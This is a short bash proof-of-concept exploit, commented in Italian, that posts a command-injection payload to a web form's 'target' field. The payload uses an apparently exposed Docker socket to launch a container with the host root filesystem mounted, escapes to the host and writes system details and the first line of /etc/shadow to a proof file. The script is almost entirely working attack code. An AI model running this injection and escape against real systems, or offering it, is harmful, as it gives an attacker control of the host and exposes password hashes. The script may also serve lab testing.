#!/usr/bin/env bash
set -euo pipefail

TARGET_URL="${1:-http://localhost:8080/}"
PROOF_HOST="/tmp/ESCAPE_PROOF.txt"
ESCAPE_IMAGE="${ESCAPE_IMAGE:-alpine}"

INJECTION="id > /host/tmp/ESCAPE_PROOF.txt; uname -a >> /host/tmp/ESCAPE_PROOF.txt; echo escaped-at-\$(date -u +%FT%TZ) >> /host/tmp/ESCAPE_PROOF.txt; head -n 1 /host/etc/shadow >> /host/tmp/ESCAPE_PROOF.txt 2>/dev/null || true"
PAYLOAD="127.0.0.1; docker run --rm -v /:/host ${ESCAPE_IMAGE} sh -c '${INJECTION}'"

echo "[*] Target: ${TARGET_URL}"
echo "[*] Invio del payload di command injection"
echo "    target = ${PAYLOAD}"
rm -f "${PROOF_HOST}" 2>/dev/null || true

curl -s -o /dev/null -X POST "${TARGET_URL}" --data-urlencode "target=${PAYLOAD}"

echo "[*] Attesa dell'esecuzione del container di escape"
for i in $(seq 1 30); do
  if [ -f "${PROOF_HOST}" ]; then
    break
  fi
  sleep 1
done

echo
if [ -f "${PROOF_HOST}" ]; then
  echo "[+] ESCAPE RIUSCITO: file scritto sul filesystem dell'host"
  echo "------------------------------------------------------------"
  cat "${PROOF_HOST}"
  echo "------------------------------------------------------------"
  echo "[+] Il contenuto e' stato generato da un container figlio con '/' dell'host montato in '/host'."
else
  echo "[!] Nessuna prova trovata: verificare che il socket sia montato e che l'app sia raggiungibile."
  exit 1
fi
